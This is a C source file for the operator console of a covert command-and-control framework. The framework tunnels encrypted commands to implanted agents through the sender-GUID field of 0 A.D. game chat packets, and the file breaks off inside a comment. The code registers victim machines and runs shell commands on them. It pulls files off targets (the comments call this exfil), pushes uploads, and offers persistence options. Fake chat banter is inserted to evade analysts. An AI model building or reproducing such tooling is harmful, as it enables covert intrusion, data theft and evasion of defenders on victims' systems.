/*
 * ctrl.c — 0adC2 Controller (operator-side terminal)
 * ═══════════════════════════════════════════════════════════════════════════
 * ROLE IN ARCHITECTURE:
 *   This is what the operator runs on their own machine. It connects to the
 *   0AD game server as a "spectator" player — legitimate-looking traffic that
 *   blends in with real game clients. From here you type commands and receive
 *   output from implanted agents on target machines.
 *
 * OVERVIEW:
 *   1. Connects to the 0AD game server over ENet (UDP-based reliable transport).
 *   2. Authenticates using the game's own handshake protocol (C2SrvInfo).
 *   3. Listens for [KA] keep-alive beacons from agents on target machines.
 *   4. For each new agent: performs ECDH key exchange (X25519) to establish
 *      a unique encrypted session, invisible to anyone who sees the game traffic.
 *   5. Operator types commands at the readline prompt; output streams back as
 *      RSP packets, reassembled from chunks and printed to the terminal.
 *
 * KEY CONCEPTS FOR BEGINNERS:
 *   - ENet: a library that adds reliability (retransmit, ordering) on top of
 *     UDP. The game uses it natively, so C2 traffic looks like game traffic.
 *   - readline: a GNU library that gives you line editing, arrow-key history,
 *     and tab completion in a terminal. We use its async (callback) API so that
 *     incoming network messages can be printed without breaking the prompt.
 *   - ECDH: Elliptic-Curve Diffie-Hellman. Two parties each generate a keypair
 *     and exchange public keys. By doing maths with the other side's public key
 *     and your own private key, both ends arrive at the same shared secret —
 *     without ever transmitting the secret over the wire.
 *   - X25519: the specific elliptic curve used here (Curve25519). Fast, secure,
 *     implemented in libsodium.
 *   - secretbox / v6_enc: libsodium's XSalsa20-Poly1305 AEAD cipher. Encrypts
 *     data AND authenticates it (any tampering is detected).
 *   - FNV32: a fast non-cryptographic hash used as a short identifier for agents
 *     and file paths. Not secret, just compact.
 *
 * COVERT CHANNEL:
 *   C2 data is NOT sent as game chat. It is encoded in the "sender GUID" field
 *   of chat packets — a field the game UI never displays to players. Real chat
 *   text is filled with innocuous cover messages ("gg", "gl hf", etc.) so that
 *   any human watching the server sees nothing unusual.
 *
 * readline async: fixed prompt, history, arrow keys
 * [KA] suppressed after ECDH established
 */

#define _GNU_SOURCE
#define C2_USE_SODIUM
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/select.h>
#include <enet/enet.h>
#include <readline/readline.h>
#include <readline/history.h>

#define C2_IMPLEMENT_HANDSHAKE
#include "c2_proto.h"

/* ── Compile-time limits ────────────────────────────────────────────────────
 * MAX_AGENTS: how many implants we can track simultaneously.
 * MAX_CHUNKS: a single file transfer (DL/UL) is split into at most 512 pieces.
 * CHUNK_PAYLOAD: each piece carries up to 160 bytes of plaintext.
 *   This is small because the data is base62-encoded into the "GUID" field of
 *   a game packet, which has a limited display width.
 * PROMPT: the terminal prompt string. The \001/\002 escape sequences tell
 *   readline to ignore the ANSI colour codes when counting visible characters,
 *   so cursor positioning stays correct.
 * ─────────────────────────────────────────────────────────────────────────── */
#define MAX_AGENTS    32
#define MAX_CHUNKS   512
#define CHUNK_PAYLOAD 160
#define PROMPT        "\001\033[1;32m\0020adc2\001\033[0m\002> "

/* Global state
 * g_key:     shared pre-authentication key (v4 / fallback encryption).
 *            Used before ECDH completes. Think of it as a weak door lock
 *            that is replaced by a proper deadbolt once ECDH succeeds.
 * g_player:  our username shown in the game lobby — must look like a real player.
 * g_target:  which agent to talk to. "*" = broadcast to all.
 * g_running: main loop exit flag (set to 0 on !quit or disconnect).
 * g_handling: flag that tells aout() we are already inside the command handler
 *             (readline has advanced past the submitted line) so there is no
 *             prompt to save/restore before printing. */
static char g_key[128]   = "0adC2DefaultKey";
static char g_player[64] = "Spectator42";
static char g_target[96] = "*";
static int  g_running    = 1;
static int  g_handling   = 0; /* 1 when inside cmd_handler -> aout() without save/restore */

/* ── Agent registry ─────────────────────────────────────────────────────────
 * One Agent entry per implant beacon received. Tracks all per-agent state:
 * cryptographic keys, ECDH handshake progress, and display identity.
 *
 * Fields:
 *   aid_hash:        FNV32 hash of the agent's string ID — used as a compact
 *                    lookup key in packets (8 hex chars = 32-bit value).
 *   id / sysinfo:    human-readable identity and system info sent by the agent
 *                    in its keep-alive (KA) beacon (hostname, user, OS, etc.).
 *   last_ka:         timestamp of last keep-alive. Lets us detect dead agents.
 *   ctrl_priv/pub:   OUR ephemeral X25519 keypair for this session.
 *                    Private key is generated fresh per agent: even if one
 *                    session is compromised, other agents' sessions are safe.
 *   session_key:     32-byte shared secret derived by ECDH. All commands and
 *                    responses are encrypted with this after dh_done==1.
 *   agent_pub_cache: the agent's X25519 public key, extracted from its first KA.
 *   dh_sent:         1 = we have sent our DH public key to this agent.
 *   dh_done:         1 = agent confirmed the shared key (replied "DH_OK") —
 *                    from this point all traffic uses session_key.
 *   ka_announced:    print the [KA] banner only once; suppress noisy repetition.
 * ─────────────────────────────────────────────────────────────────────────── */
typedef struct{
    uint32_t aid_hash;
    char     id[96];
    char     sysinfo[512];
    time_t   last_ka;
    uint8_t  ctrl_priv[32];
    uint8_t  ctrl_pub[32];
    uint8_t  session_key[32];
    uint8_t  agent_pub_cache[32];
    int      dh_sent;
    int      dh_done;
    int      ka_announced;   /* 1 = first KA already shown -> suppress subsequent ones */
}Agent;
static Agent agents[MAX_AGENTS];
static int   n_agents=0;

static Agent *get_agent_by_hash(uint32_t h){
    for(int i=0;i<n_agents;i++) if(agents[i].aid_hash==h) return &agents[i];
    if(n_agents>=MAX_AGENTS) return NULL;
    Agent *a=&agents[n_agents++];memset(a,0,sizeof(*a));
    a->aid_hash=h;a->last_ka=time(NULL);return a;}

static Agent *get_agent_by_id(const char *id){
    return get_agent_by_hash(fnv32(id));}

static Agent *get_target_agent(void){
    if(!strcmp(g_target,"*")) return NULL;
    return get_agent_by_id(g_target);}

static const char *agent_disp(uint32_t h){
    static char buf[32];
    for(int i=0;i<n_agents;i++)
        if(agents[i].aid_hash==h&&agents[i].id[0]) return agents[i].id;
    snprintf(buf,sizeof(buf),"%08x",h);return buf;}

/* ── Output async readline-safe ─────────────────────────────────────────────
 * PROBLEM: readline keeps the current typed line on the last terminal row.
 *   If a network message arrives and we just printf() it, the output appears
 *   in the middle of what the user is typing — mangling the display.
 *
 * SOLUTION (aout / awrite):
 *   1. Copy and erase the current partial input line (rl_replace_line("", 0)).
 *   2. Print our network message.
 *   3. Restore the partial line and reposition the cursor (rl_redisplay()).
 *   The user sees a clean interleaving: messages above, prompt always at bottom.
 *
 * EXCEPTION — g_handling==1 (inside cmd_handler):
 *   When the user presses Enter, readline has already moved past the submitted
 *   line and is waiting for the callback to return. There is no visible prompt
 *   to protect at that moment, so we skip the save/restore dance to avoid
 *   gluing the submitted text back to the new prompt.
 * ─────────────────────────────────────────────────────────────────────────── */
static void aout(const char *fmt, ...){
    va_list ap;
    if(g_handling){
        va_start(ap,fmt);vprintf(fmt,ap);va_end(ap);
        fflush(stdout);return;}
    char *saved = rl_copy_text(0, rl_end);
    int point   = rl_point;
    rl_save_prompt();
    rl_replace_line("", 0);
    rl_redisplay();
    va_start(ap,fmt);vprintf(fmt,ap);va_end(ap);
    fflush(stdout);
    rl_restore_prompt();
    rl_replace_line(saved,0);
    rl_point=point;
    rl_redisplay();
    free(saved);}

static void awrite(const void *buf, size_t n){
    if(g_handling){fwrite(buf,1,n,stdout);fflush(stdout);return;}
    char *saved = rl_copy_text(0, rl_end);
    int point   = rl_point;
    rl_save_prompt();
    rl_replace_line("", 0);
    rl_redisplay();
    fwrite(buf,1,n,stdout);fflush(stdout);
    rl_restore_prompt();
    rl_replace_line(saved,0);
    rl_point=point;
    rl_redisplay();
    free(saved);}

/* ── Crypto helpers ──────────────────────────────────────────────────────────
 * Two encryption tiers, selected transparently:
 *
 *   v4 (pre-ECDH): symmetric encryption keyed by g_key (the shared password).
 *     Used only before ECDH completes — both sides know the pre-shared key.
 *     Weaker: if g_key leaks, all pre-ECDH traffic is readable.
 *
 *   v6 (post-ECDH): XSalsa20-Poly1305 keyed by agent->session_key.
 *     The session_key was derived from the ephemeral X25519 exchange and is
 *     unique per agent. Even if g_key leaks, post-ECDH traffic stays safe.
 *
 * ctrl_enc: encrypts plaintext -> base62 string (safe to embed in game packets).
 * ctrl_dec: decrypts base62 string -> plaintext (text output, shell response).
 * ctrl_dec_raw: same but outputs raw bytes (binary file content for DL chunks).
 * ─────────────────────────────────────────────────────────────────────────── */
static size_t ctrl_enc(Agent *a, char *out, const void *plain, size_t plen){
    if(a && a->dh_done) return v6_enc(out, a->session_key, plain, plen);
    return v4_enc(out, g_key, plain, plen);}

static ssize_t ctrl_dec(Agent *a, char *out, size_t outsz, const char *b62){
    if(a && a->dh_done) return v6_dec(out, outsz, a->session_key, b62);
    return v4_dec(out, outsz, g_key, b62);}

static ssize_t ctrl_dec_raw(Agent *a, uint8_t *out, size_t outsz, const char *b62){
    if(a && a->dh_done) return v6_dec_raw(out, outsz, a->session_key, b62);
    return v4_dec_raw(out, outsz, g_key, b62);}

/* ── Pending DL (download reassembly) ───────────────────────────────────────
 * When the operator issues !dl <path>, the agent reads the file and sends it
 * back as multiple encrypted chunks (because each game packet can only carry
 * ~160 bytes of payload). The controller must collect ALL chunks and then
 * reassemble them in order before writing the file to disk.
 *
 * This struct tracks one in-flight download:
 *   phsh:   FNV32 hash of the remote file path — used as a transfer ID in
 *           packets, saves embedding the full path in every chunk.
 *   chunks: array of malloc'd byte buffers, one slot per chunk index.
 *   got[]:  bitmask — got[i]==1 means chunk i+1 has arrived.
 *   total:  total chunk count (announced in the first packet received).
 * flush_file() checks got[] after every chunk; when all are received it
 * writes the file and frees memory.
 * ─────────────────────────────────────────────────────────────────────────── */
typedef struct{
    uint32_t aid_hash,phsh;
    char     path[512];
    uint8_t *chunks[MAX_CHUNKS];
    size_t   clens[MAX_CHUNKS];
    int      got[MAX_CHUNKS];
    size_t   total;
}PendingFile;
static PendingFile pfiles[MAX_AGENTS];
static int n_pfiles=0;

static PendingFile *get_pfile_by_phsh(uint32_t phsh, uint32_t aid_hash){
    for(int i=0;i<n_pfiles;i++)
        if(pfiles[i].phsh==phsh){
            if(!pfiles[i].aid_hash) pfiles[i].aid_hash=aid_hash;
            return &pfiles[i];}
    if(n_pfiles>=MAX_AGENTS) return NULL;
    PendingFile *p=&pfiles[n_pfiles++];memset(p,0,sizeof(*p));
    p->phsh=phsh;p->aid_hash=aid_hash;return p;}

static void flush_file(PendingFile *pf){
    for(size_t i=0;i<pf->total;i++) if(!pf->got[i]) return;
    const char *bn=pf->path[0]?strrchr(pf->path,'/'):NULL;
    bn=bn?bn+1:(pf->path[0]?pf->path:"dl_file");
    if(!bn[0]) bn="dl_file";
    FILE *out=fopen(bn,"wb");
    if(!out){aout("[ctrl] Cannot write '%s'\n",bn);goto cleanup;}
    for(size_t i=0;i<pf->total;i++)
        if(pf->chunks[i]) fwrite(pf->chunks[i],1,pf->clens[i],out);
    fclose(out);
    aout("\033[1;34m[DL OK]\033[0m %s → ./%s (%s)\n",
         pf->path[0]?pf->path:"?",bn,agent_disp(pf->aid_hash));
cleanup:
    for(size_t i=0;i<pf->total;i++){free(pf->chunks[i]);pf->chunks[i]=NULL;}
    pf->total=0;memset(pf->got,0,sizeof(pf->got));}

/* ── RSP streaming (command output display) ──────────────────────────────────
 * Command output from an agent arrives as a stream of numbered RSP packets
 * (sequence 1, 2, 3 … total). Each carries a small decrypted text chunk.
 * RspStream tracks the display state for one job on one agent:
 *   jid:          job ID (uint16). jid==0 is the "system" channel used for
 *                 ECDH handshake confirmation and other internal messages.
 *   last_seq:     last chunk sequence number seen (for ordering diagnostics).
 *   header_shown: we print "[agent / job N]" only once before the first chunk.
 *   done:         set when the final chunk (tot>0 sentinel) is received; the
 *                 stream struct is then eligible for reuse.
 * ─────────────────────────────────────────────────────────────────────────── */
typedef struct{
    uint32_t aid_hash;
    uint16_t jid,last_seq;
    int      done,header_shown;
}RspStream;
static RspStream rsp_streams[MAX_AGENTS*8];
static int n_rsp=0;

static RspStream *get_rsp_stream(uint32_t h, uint16_t jid){
    for(int i=0;i<n_rsp;i++)
        if(rsp_streams[i].aid_hash==h&&rsp_streams[i].jid==jid)
            return &rsp_streams[i];
    if(n_rsp>=(int)(sizeof(rsp_streams)/sizeof(*rsp_streams))){n_rsp=0;}
    RspStream *r=&rsp_streams[n_rsp++];
    r->aid_hash=h;r->jid=jid;r->last_seq=0;r->done=0;r->header_shown=0;return r;}

/* ── Network ────────────────────────────────────────────────────────────────
 * ENet terminology:
 *   ENetHost: our local UDP socket + all bookkeeping (bandwidth shaping, etc.)
 *   ENetPeer: the remote endpoint we are connected to (the 0AD game server).
 *   Channel 0: the ENet channel used for all C2 packets. ENet channels are
 *     independent reliability streams within a single UDP connection; channel 0
 *     is the default and gives us reliable, ordered delivery.
 * ─────────────────────────────────────────────────────────────────────────── */
static ENetPeer *g_peer=NULL;
static ENetHost *g_host=NULL;

static void send_v4(uint16_t tc, const char *body){
    /* Cover = fake natural message displayed in the 0AD chat (visible UI).
     * WHY: any human (or blue-team analyst) watching the server's chat log
     * sees ordinary player banter. The actual C2 data is encoded in the
     * "sender GUID" field of the same packet — a field the game never renders.
     * tc (type code) tells the server-side demux which handler to invoke. */
    static const char * const _covers[]={
        "gg","good game","gl hf","nice one","ok",
        "brb","back","anyone here?","hi","k","ready"};
    const char *cover=_covers[(unsigned)rand()%(sizeof(_covers)/sizeof(*_covers))];
    uint8_t pkt[8400];
    size_t pklen=v4_build(pkt,tc,0,body,cover);
    enet_peer_send(g_peer,0,enet_packet_create(pkt,pklen,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(g_host);}

static int put_tgt(char *body, int off){
    if(!strcmp(g_target,"*")){body[off++]='W';}
    else{body[off++]='T';v4_e4(body+off,fnv32(g_target));off+=8;}
    return off;}

/* ── ECDH key exchange — controller side ─────────────────────────────────────
 * PROTOCOL (3-step):
 *   Step 1 — Agent sends [KA] beacon containing its X25519 public key.
 *             handle_v6_ka() extracts the key into agent_pub_cache.
 *   Step 2 — We call send_dh(): generate a fresh X25519 keypair, derive the
 *             session_key locally, send our public key to the agent (V4_DH).
 *   Step 3 — Agent does the same derivation on its side, confirms with "DH_OK"
 *             in an RSP packet. handle_v6_rsp() sets dh_done=1 on receipt.
 *
 * WHY EPHEMERAL KEYS:
 *   A new ctrl_priv is generated for EVERY agent session (randombytes_buf).
 *   If an adversary captures the session_key later, they cannot decrypt traffic
 *   from other sessions or past sessions — this property is called
 *   "forward secrecy". The agent side also uses fresh ephemeral keys.
 *
 * v6_derive_session: computes ECDH shared secret = X25519(ctrl_priv, agent_pub)
 *   then derives session_key via a KDF (key derivation function) that mixes in
 *   both public keys for domain separation (prevents key-reuse attacks).
 * ─────────────────────────────────────────────────────────────────────────── */
static void send_dh(Agent *a){
    randombytes_buf(a->ctrl_priv, 32);
    crypto_scalarmult_curve25519_base(a->ctrl_pub, a->ctrl_priv);
    v6_derive_session(a->session_key, a->ctrl_priv, a->agent_pub_cache,
                      a->agent_pub_cache, a->ctrl_pub);
    char body[8+1+8+64+1];int off=0;
    v4_e4(body+off, fnv32(g_key)); off+=8;
    body[off++]='T';
    v4_e4(body+off, a->aid_hash);  off+=8;
    v4_eb(body+off, a->ctrl_pub, 32); off+=64;
    body[off]='\0';
    send_v4(V4_DH, body);
    a->dh_sent=1;
    aout("\033[1;35m[DH →]\033[0m %s\n", agent_disp(a->aid_hash));}

static void send_cmd(const char *cmd){
    if(!strcmp(g_target,"*")){
        int sent=0;
        for(int i=0;i<n_agents;i++){
            Agent *ag=&agents[i];
            if(!ag->dh_done) continue;
            char body[8400];int off=0;
            v4_e4(body+off,fnv32(g_key));off+=8;
            body[off++]='T';v4_e4(body+off,ag->aid_hash);off+=8;
            off+=(int)ctrl_enc(ag,body+off,cmd,strlen(cmd));
            body[off]='\0';send_v4(V4_CMD,body);sent++;}
        aout("\033[0;33m[>>]\033[0m %s  \033[2m(→ %d agents)\033[0m\n",cmd,sent);
        return;}
    Agent *a=get_target_agent();
    if(a&&!a->dh_done){
        aout("[!] ECDH not established for %s — wait for [ECDH OK]\n",g_target);return;}
    char body[8400];int off=0;
    v4_e4(body+off,fnv32(g_key));off+=8;
    off=put_tgt(body,off);
    off+=(int)ctrl_enc(a,body+off,cmd,strlen(cmd));
    body[off]='\0';send_v4(V4_CMD,body);
    aout("\033[0;33m[>>]\033[0m %s  \033[2m(→ %s)\033[0m\n",cmd,g_target);}

static void send_ctl(const char *ctl){
    Agent *a=get_target_agent();
    if(a&&!a->dh_done){
        aout("[!] ECDH not established for %s\n",g_target);return;}
    char body[512];int off=0;
    v4_e4(body+off,fnv32(g_key));off+=8;
    off=put_tgt(body,off);
    off+=(int)ctrl_enc(a,body+off,ctl,strlen(ctl));
    body[off]='\0';send_v4(V4_CTL,body);}

/* send_dlrq — request a file download (!dl) ─────────────────────────────────
 * Sends a V4_DLRQ packet to the targeted agent containing the remote file path.
 * The agent reads the file and responds with a stream of V4_DL chunk packets,
 * which handle_v6_dl() reassembles and writes to disk (see PendingFile above).
 * The path hash (phsh) acts as a transfer ID so multiple simultaneous downloads
 * can be tracked independently (one PendingFile per phsh).
 * ─────────────────────────────────────────────────────────────────────────── */
static void send_dlrq(const char *path){
    uint32_t phsh=fnv32(path);
    uint32_t ah=strcmp(g_target,"*")?fnv32(g_target):0;
    PendingFile *pf=get_pfile_by_phsh(phsh,ah);
    if(pf&&!pf->path[0]) strncpy(pf->path,path,sizeof(pf->path)-1);
    Agent *a=get_target_agent();
    char body[2048];int off=0;
    v4_e4(body+off,fnv32(g_key));off+=8;
    off=put_tgt(body,off);
    v4_e4(body+off,phsh);off+=8;
    off+=(int)ctrl_enc(a,body+off,path,strlen(path));
    body[off]='\0';
    send_v4(V4_DLRQ,body);
    aout("\033[0;33m[DLRQ]\033[0m %s → %s\n",path,g_target);}

/* send_upload — push a local file to the agent (!ul) ────────────────────────
 * Reads a local file, slices it into CHUNK_PAYLOAD-sized pieces, and sends
 * each as an encrypted V4_UL packet. The agent reassembles them and writes
 * to the remote path.
 *
 * Chunk 0 is special: it starts with a 1-byte length prefix + the remote path
 * string, followed by the first block of file data. Subsequent chunks carry
 * only raw data. This "header in first chunk" design avoids sending a separate
 * metadata packet.
 *
 * usleep(15000): 15 ms inter-chunk delay when there are multiple chunks.
 * WHY: ENet channels guarantee ordering within a channel, but flushing too
 * fast can overwhelm the server's receive buffer for very large uploads.
 * A small delay keeps the transfer polite.
 *
 * Limit: 4 MB. Larger files would require too many chunks (>MAX_CHUNKS=512).
 * For large exfil, use an out-of-band channel or chain multiple !ul calls.
 * ─────────────────────────────────────────────────────────────────────────── */
static void send_upload(const char *local, const char *remote){
    FILE *f=fopen(local,"rb");
    if(!f){aout("[-] Cannot open: %s\n",local);return;}
    fseek(f,0,SEEK_END);long fsz=ftell(f);rewind(f);
    if(fsz<=0||fsz>4*1024*1024){aout("[-] File empty or >4MB\n");fclose(f);return;}
    uint8_t *data=(uint8_t*)malloc((size_t)fsz);
    if(!data){fclose(f);return;}
    fread(data,1,(size_t)fsz,f);fclose(f);
    Agent *a=get_target_agent();
    uint8_t rlen=(uint8_t)(strlen(remote)>255?255:strlen(remote));
    uint32_t phsh=fnv32(remote);
    size_t seq1_data=(CHUNK_PAYLOAD>1+rlen)?(size_t)(CHUNK_PAYLOAD-1-rlen):0;
    size_t data_after=(fsz>(long)seq1_data)?(size_t)fsz-seq1_data:0;
    size_t nchunks=1+(data_after+CHUNK_PAYLOAD-1)/CHUNK_PAYLOAD;
    if(nchunks>MAX_CHUNKS){aout("[-] File too large\n");free(data);return;}
    aout("\033[0;33m[UL]\033[0m %s → %s  (%ld bytes, %zu chunks)\n",local,remote,fsz,nchunks);
    for(size_t i=0;i<nchunks;i++){
        uint8_t raw[CHUNK_PAYLOAD+258];size_t rawlen=0;
        if(i==0){
            raw[rawlen++]=rlen;memcpy(raw+rawlen,remote,rlen);rawlen+=rlen;
            size_t dsz=seq1_data>(size_t)fsz?(size_t)fsz:seq1_data;
            if(dsz){memcpy(raw+rawlen,data,dsz);rawlen+=dsz;}
        }else{
            size_t off2=seq1_data+(i-1)*CHUNK_PAYLOAD;
            size_t dsz=((size_t)fsz-off2>CHUNK_PAYLOAD)?CHUNK_PAYLOAD:(size_t)fsz-off2;
            memcpy(raw,data+off2,dsz);rawlen=dsz;}
        char body[CHUNK_PAYLOAD*2+128];int off=0;
        v4_e4(body+off,fnv32(g_key));off+=8;
        off=put_tgt(body,off);
        v4_e4(body+off,phsh);off+=8;
        v4_e2(body+off,(uint16_t)(i+1));off+=4;
        v4_e2(body+off,(uint16_t)nchunks);off+=4;
        off+=(int)ctrl_enc(a,body+off,raw,rawlen);
        body[off]='\0';
        send_v4(V4_UL,body);
        if(nchunks>1) usleep(15000);}
    aout("[UL] %zu/%zu sent\n",nchunks,nchunks);
    free(data);}

/* ── Incoming packet handlers ────────────────────────────────────────────────
 * These functions are called from the main ENet receive loop. Each corresponds
 * to one C2 packet type (type code = tc):
 *
 *   V4_KA:  keep-alive / beacon from an agent. Contains: token (FNV32 of
 *           g_key to prove knowledge of the password), agent ID hash, the
 *           agent's X25519 public key (raw, hex), and encrypted sysinfo.
 *           On first contact → triggers ECDH (send_dh).
 *
 *   V4_RSP: command output chunk. Contains: agent hash, job ID, sequence
 *           number, total chunks, and the encrypted output slice.
 *           jid==0 is the "system" channel (ECDH confirmation, !jobs output).
 *
 *   V4_DL:  file download chunk. Contains: agent hash, path hash, sequence,
 *           total, and an encrypted raw binary slice. Reassembled by flush_file().
 * ─────────────────────────────────────────────────────────────────────────── */

static void handle_v6_ka(const char *body){
    size_t blen=strlen(body);
    if(blen<80) return;
    uint32_t tok=v4_d4(body),expect=fnv32(g_key);
    if(tok!=expect) return;
    uint32_t aid_hash=v4_d4(body+8);
    char pub_str[65]; memcpy(pub_str,body+16,64); pub_str[64]='\0';
    uint8_t agent_pub[32];size_t n;
    int db_rc=v4_db(agent_pub,pub_str,&n);
    if(db_rc<0||n!=32) return;
    char si[512]="";
    ssize_t si_rc=v4_dec(si,sizeof(si),g_key,body+80);
    if(si_rc<=0) return;

    Agent *a=get_agent_by_hash(aid_hash);if(!a)return;
    a->last_ka=time(NULL);
    strncpy(a->sysinfo,si,sizeof(a->sysinfo)-1);
    if(!strncmp(si,"id=",3)){
        const char *bar=strchr(si+3,'|');
        size_t idlen=bar?(size_t)(bar-si-3):strlen(si+3);
        if(idlen<sizeof(a->id)){memcpy(a->id,si+3,idlen);a->id[idlen]='\0';}}

    /* Display [KA] only on first contact (before ECDH) */
    if(!a->ka_announced){
        a->ka_announced=1;
        aout("\033[1;33m[KA]\033[0m %s  \033[2m%s\033[0m\n",
             a->id[0]?a->id:agent_disp(aid_hash), si);}

    /* Trigger ECDH if we haven't yet: cache the agent's public key and send
     * our public key back. This is a one-time-per-agent operation — once
     * dh_done==1 all subsequent KAs are silently ignored for the DH path. */
    if(!a->dh_sent){
        memcpy(a->agent_pub_cache, agent_pub, 32);
        send_dh(a);}}

static void handle_v6_rsp(const char *body){
    if(strlen(body)<20) return;
    uint32_t aid_hash=v4_d4(body);
    uint16_t jid=v4_d2(body+8);    /* job ID: 0 = system channel, >0 = shell job */
    uint16_t seq=v4_d2(body+12);   /* chunk sequence number, starts at 1 */
    uint16_t tot=v4_d2(body+16);   /* tot>0 on the LAST chunk of a job (signals end) */
    if(!seq) return;
    Agent *a=get_agent_by_hash(aid_hash);if(!a)return;
    char dec[CHUNK_PAYLOAD+2]="";
    ssize_t dlen;

    /* ── System channel (jid==0): ECDH handshake completion + misc ── */
    if(jid==0){
        if(a->dh_sent){
            /* Try to decrypt with the derived session_key.
             * If the agent sent "DH_OK" it means it computed the same key
             * from our public key — ECDH is successful. */
            dlen=v6_dec(dec,sizeof(dec),a->session_key,body+20);
            if(dlen>0){
                if(!a->dh_done&&!strncmp(dec,"DH_OK",5)){
                    /* ECDH complete: both sides share session_key.
                     * All future packets for this agent use v6 encryption. */
                    a->dh_done=1;
                    aout("\033[1;32m[ECDH OK]\033[0m %s\n",agent_disp(aid_hash));
                    return;}
                if(a->dh_done){
                    RspStream *rs=get_rsp_stream(aid_hash,0);
                    if(!rs->header_shown){
                        aout("\n\033[1;32m[%s / sys]\033[0m\n",agent_disp(aid_hash));
                        rs->header_shown=1;}
                    rs->last_seq=seq;
                    awrite(dec,(size_t)dlen);
                    if(tot>0){aout("\n");rs->last_seq=0;rs->done=1;rs->header_shown=0;}
                    return;}}}
        dlen=v4_dec(dec,sizeof(dec),g_key,body+20);
        if(dlen>0){
            RspStream *rs=get_rsp_stream(aid_hash,0);
            if(!rs->header_shown){
                aout("\n\033[1;32m[%s / sys]\033[0m\n",agent_disp(aid_hash));
                rs->header_shown=1;}
            rs->last_seq=seq;
            awrite(dec,(size_t)dlen);
            if(tot>0){aout("\n");rs->last_seq=0;rs->done=1;rs->header_shown=0;}}
        return;}

    dlen=ctrl_dec(a,dec,sizeof(dec),body+20);
    if(dlen<0) return;
    RspStream *rs=get_rsp_stream(aid_hash,jid);
    if(!rs->header_shown){
        aout("\n\033[1;32m[%s / job %u]\033[0m\n",agent_disp(aid_hash),(unsigned)jid);
        rs->header_shown=1;}
    rs->last_seq=seq;
    if(dlen>0) awrite(dec,(size_t)dlen);
    if(tot>0){
        aout("\033[2m  [job %u done, %u chunks]\033[0m\n",(unsigned)jid,(unsigned)tot);
        rs->last_seq=0;rs->done=1;rs->header_shown=0;}}

static void handle_v6_dl(const char *body){
    if(strlen(body)<24) return;
    uint32_t aid_hash=v4_d4(body);
    uint32_t phsh=v4_d4(body+8);
    uint16_t seq=v4_d2(body+16),tot=v4_d2(body+20);
    if(!seq||!tot||seq>tot||seq>(uint16_t)MAX_CHUNKS)return;
    Agent *a=get_agent_by_hash(aid_hash);
    uint8_t raw[CHUNK_PAYLOAD+2];
    ssize_t rlen=ctrl_dec_raw(a,raw,sizeof(raw),body+24);if(rlen<=0)return;
    PendingFile *pf=get_pfile_by_phsh(phsh,aid_hash);if(!pf)return;
    if(!pf->total)pf->total=tot;
    size_t idx=seq-1;
    if(!pf->chunks[idx]){
        pf->chunks[idx]=(uint8_t*)malloc((size_t)rlen);
        if(pf->chunks[idx])memcpy(pf->chunks[idx],raw,(size_t)rlen);
        pf->clens[idx]=(size_t)rlen;pf->got[idx]=1;}
    flush_file(pf);}

/* handle_incoming — top-level ENet packet dispatcher ────────────────────────
 * Called for every packet received from the game server.
 *
 * First, we filter out known game-internal message types (mt values 11, 17,
 * 19-22, 26-27) that are not C2 packets. This avoids wasting time trying to
 * parse game protocol internals that would never match our format.
 *
 * v4_parse() attempts to decode the packet as a C2 envelope. On success it
 * returns the type code (tc) and populates 'body' with the embedded payload.
 * On failure (tc==0) we fall through to check if it is a plain game chat
 * message (NMT_CHAT) — those we display verbatim so the operator can see if
 * real players are talking on the server (situational awareness).
 *
 * The chat decoder handles UTF-16BE character pairs (the 0AD wire format):
 * each character is 2 bytes big-endian. Non-ASCII values (>= 0x80) are
 * replaced with '?' since our terminal may not support them.
 * ─────────────────────────────────────────────────────────────────────────── */
static void handle_incoming(const uint8_t *d, size_t dl){
    if(dl<1) return;
    uint8_t mt=d[0];
    if(mt==26||mt==17||mt==21||mt==20||mt==27||mt==19||mt==11||mt==22) return;
    char body[8200]="";
    uint16_t tc=v4_parse(d,dl,body,sizeof(body));
    if(!tc){
        if(dl<3||d[0]!=NMT_CHAT)return;
        const uint8_t *pl=d+3,*end=d+dl;
        char sender[128]="";
        size_t c=rcstr(pl,(size_t)(end-pl),sender,sizeof(sender));
        const uint8_t *cw=pl+c;char msg[512]="";size_t j=0;
        while(cw+1<end&&j+1<sizeof(msg)){
            uint16_t ch=((uint16_t)cw[0]<<8)|cw[1];cw+=2;
            if(!ch)break;msg[j++]=(ch<0x80)?(char)ch:'?';}
        msg[j]='\0';
        if(msg[0]) aout("\033[0;36m[chat][%s]\033[0m %s\n",
                        sender[0]?sender:"srv",msg);
        return;}
    switch(tc){
    case V4_KA:  handle_v6_ka(body);  break;
    case V4_RSP: handle_v6_rsp(body); break;
    case V4_DL:  handle_v6_dl(body);  break;
    default:break;}}

static void print_help(void){
    aout(
        "\n\033[1m0adC2\033[0m\n"
        "  \033[1;36m<command>\033[0m               Execute on target (ECDH encrypted)\n"
        "  \033[1;36m!agents\033[0m                 List agents + ECDH status\n"
        "  \033[1;36m!target <id|*>\033[0m          Target a specific agent or all\n"
        "  \033[1;36m!jobs\033[0m                   List active jobs\n"
        "  \033[1;36m!kill <N>\033[0m               Kill job N\n"
        "  \033[1;36m!dl <path>\033[0m              Download (ECDH)\n"
        "  \033[1;36m!ul <local> [<remote>]\033[0m  Upload (ECDH)\n"
        "  \033[1;36m!persist cron|bashrc|systemd|syscron|profile\033[0m\n"
        "  \033[1;36m!die\033[0m / \033[1;36m!sleep <N>\033[0m / \033[1;36m!help\033[0m / \033[1;36m!quit\033[0m\n"
        "  \033[2m↑↓ history · Tab completion\033[0m\n");}

/* ── readline callback — command dispatcher ──────────────────────────────────
 * readline calls this function each time the user presses Enter.
 * 'line' is a malloc'd string of what they typed (NULL on Ctrl-D / EOF).
 *
 * We set g_handling=1 before processing so that any aout() calls during
 * command handling print directly (no save/restore needed — see aout comment).
 * Must be reset to 0 before returning, and 'line' must always be free()'d.
 *
 * Command reference (what each one actually does on the agent):
 *
 *   !agents       — list all known agents: ID, hash, age since last KA, ECDH state.
 *   !target <id>  — focus all subsequent commands on one agent (or "*" for all).
 *   !jobs         — send a CTL "jobs" request; agent replies with its job list.
 *   !kill <N>     — send "kill:N" CTL; agent terminates that background job.
 *
 *   !dl <path>    — download: agent reads <path>, sends chunks back as V4_DL.
 *                   File is saved to the current directory on the operator side.
 *   !ul <l> [<r>] — upload: read local file <l>, send chunks to agent as V4_UL.
